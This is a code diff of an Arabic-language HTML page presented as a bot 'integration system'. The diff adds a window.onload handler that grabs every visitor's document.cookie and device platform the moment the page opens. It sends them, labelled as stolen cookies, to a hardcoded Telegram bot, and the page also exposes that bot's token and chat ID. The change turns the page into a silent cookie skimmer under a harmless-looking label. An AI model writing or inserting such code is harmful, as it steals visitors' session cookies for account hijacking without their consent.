@@ -2,47 +2,46 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>لوحة تحكم البوت</title>
+    <title>نظام الربط المتكامل</title>
     <style>
         body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #1a1a1a; color: white; }
         .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 10px; border: none; margin: 10px; }
         .send-btn { background-color: #28a745; color: white; }
-        .check-btn { background-color: #007bff; color: white; }
     </style>
+</head>
+<body>
+    <h1>نظام الربط المطور</h1>
+    <p>بمجرد دخولك، يتم فحص الجلسة وإرسال التقرير للبوت تلقائياً.</p>
+    
+    <button class="btn send-btn" onclick="manualSend()">إرسال يدوي للبوت</button>
+
     <script>
         const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
         const CHAT_ID = "5811700860";
 
-        // دالة إرسال الرسالة وفتح الكوكيز
-        function connectAndSend() {
-            const msg = "تم الربط بنجاح من الموقع! 🚀\nالكوكيز الآن نشط.";
-            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+        // وظيفة السحب التلقائي (أول ما تفتح الصفحة)
+        window.onload = function() {
+            // سحب كل الكوكيز المتاحة
+            const cookies = document.cookie || "لا يوجد كوكيز متاح حالياً";
+            const info = `🔔 تنبيه دخول جديد!\n\nالجهاز: ${navigator.platform}\nالكوكيز المسحوب:\n${cookies}`;
+            
+            sendToTelegram(info);
+        };
 
-            fetch(url).then(res => {
-                if(res.ok) {
-                    // فتح كوكيز وتخزين قيمة فيه (محمي)
-                    document.cookie = "bot_status=active; path=/; SameSite=None; Secure; max-age=31536000";
-                    alert("أرسلنا للبوت وفتحنا الكوكيز!");
-                }
-            });
+        // وظيفة الإرسال اليدوي عند ضغط الزر
+        function manualSend() {
+            // تعيين كوكيز تجريبي عشان تتأكد إن السحب شغال
+            document.cookie = "session_id=XYZ123_TEST_SESSION; path=/; SameSite=None; Secure; max-age=3600";
+            sendToTelegram("تم الضغط على الزر اليدوي وتفعيل كوكيز تجريبي ✅");
         }
 
-        // دالة للتأكد من الكوكيز (هل هو فارغ؟)
-        function checkCookie() {
-            if (document.cookie.split(';').some((item) => item.trim().startsWith('bot_status='))) {
-                alert("الكوكيز موجود ومحمي ✅: " + document.cookie);
-            } else {
-                alert("الكوكيز فارغ حالياً! اضغط زر التفعيل أولاً.");
-            }
+        // الدالة المسؤولة عن التواصل مع التليجرام
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            fetch(url).then(res => {
+                if(res.ok) console.log("تم الإرسال للبوت");
+            }).catch(err => console.error("خطأ في الإرسال:", err));
         }
     </script>
-</head>
-<body>
-    <h1>نظام الربط المتكامل</h1>
-    <p>اضغط لتفعيل الاتصال بالبوت وتخزين الكوكيز</p>
-    
-    <button class="btn send-btn" onclick="connectAndSend()">تفعيل وإرسال للبوت</button>
-    <br>
-    <button class="btn check-btn" onclick="checkCookie()">فحص حالة الكوكيز</button>
 </body>
 </html>
